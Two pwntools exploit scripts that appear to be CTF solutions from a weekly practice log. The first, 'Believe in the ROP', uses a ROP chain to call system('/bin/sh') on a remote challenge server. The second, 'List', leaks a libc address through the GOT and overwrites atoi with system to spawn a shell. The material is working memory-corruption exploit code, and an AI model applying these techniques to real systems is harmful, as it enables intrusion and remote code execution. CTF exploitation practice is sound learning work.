# Week 12

## Believe in the ROP

```python
from pwn import *
elf = ELF('e:\\desk\\chall1')
p = remote("pwn.challenge.ctf.show", 28160)
context.log_level = 'debug'
pop_rdi = 0x401453
return_addr = pop_rdi + 1
system_addr = 0x4011e5


addr = p.recvuntil(b'  <- saved rbp')[-(12+14):-14].decode()
binsh_addr = int(addr, 16) - 0x20

p.sendline(b"/bin/sh\x00".ljust(0x10, b"\x00") + b"b" * 8+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr))

p.interactive()
```

## List

```python
from pwn import *
from LibcSearcher import *

elf = ELF('chall2')
p = elf.process() # remote("pwn.challenge.ctf.show", 28160)
context.log_level = 'debug'
pop_rdi = 0x401703
atoi_got = elf.got['atoi']

p.sendlineafter(b">", b"1")
p.sendlineafter(b":", b"x")
p.sendlineafter(b">", b"1")
p.sendlineafter(b":", b"x")

p.sendlineafter(b">", b"2")
p.sendlineafter(b":", b"0")
p.sendlineafter(b"New content:", b"\x00"*40 + p64(atoi_got - 8) + b'\x00' * 8)

p.sendlineafter(b">", b"2")
p.sendlineafter(b":", b"2")

addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

obj = LibcSearcher('atoi', addr)
print(hex(obj.dump('atoi')))
libc_base = addr - obj.dump('atoi')
print(hex(obj.dump("system")))
system_addr = obj.dump("system") + libc_base
print(hex(system_addr))

p.sendlineafter(b"New content:", p64(system_addr))
p.sendlineafter(b">", b"/bin/sh")

p.interactive()
```